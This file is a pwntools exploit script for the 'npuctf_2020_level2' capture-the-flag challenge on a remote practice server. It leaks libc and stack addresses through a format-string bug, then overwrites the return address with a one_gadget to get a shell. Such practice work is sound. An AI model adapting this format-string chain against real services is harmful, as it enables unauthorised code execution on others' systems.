from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-27/ld-2.27.so"
libc_path = "/home/fanxinli/libc-so/libc-2.27-64.so"
# p = process([ld_path, "./npuctf_2020_level2"], env={"LD_PRELOAD":libc_path})
p = remote("node4.buuoj.cn", 25555)


def send(pad):
    pad = pad.ljust(0x64, b"\x00")
    p.send(pad)


# leak libc and stack
send(b"%7$p-%9$p-")
info = int(p.recvuntil("-", drop=True), 16)
libc = ELF(libc_path)
libc_base =  info-libc.sym["__libc_start_main"]-231
print("libc: ", hex(info))
print("base: ", hex(libc_base))

info = int(p.recvuntil("-", drop=True), 16)
print("stack: ", hex(info))
ret_addr = info-0xe0

# count
oneshot = libc_base+0x4f322
print("oneshot: ", hex(oneshot))

# alter %35$p to ret_addr 
pad = "%{}c%9$hn---".format(ret_addr & 0xffff)
pad = pad.encode("ISO-8859-1")
send(pad)
p.recvuntil("---")

# alter ret_addr to oneshot
# this only change two Bytes
pad = "%{}c%35$hn---".format(oneshot & 0xffff)
pad = pad.encode("ISO-8859-1")
send(pad)
p.recvuntil("---")

# alter %35$p to ret_addr+0x2
pad = "%{}c%9$hn---".format((ret_addr & 0xffff) + 0x2)
pad = pad.encode("ISO-8859-1")
send(pad)
p.recvuntil("---")

# alter ret_addr+0x2 to oneshot
# this only change one byte
pad = "%{}c%35$hhn---".format((oneshot >> 16) & 0xff)
pad = pad.encode("ISO-8859-1")
send(pad)
p.recvuntil("---")

# attack
p.sendline(b"66666666\x00")

p.interactive()


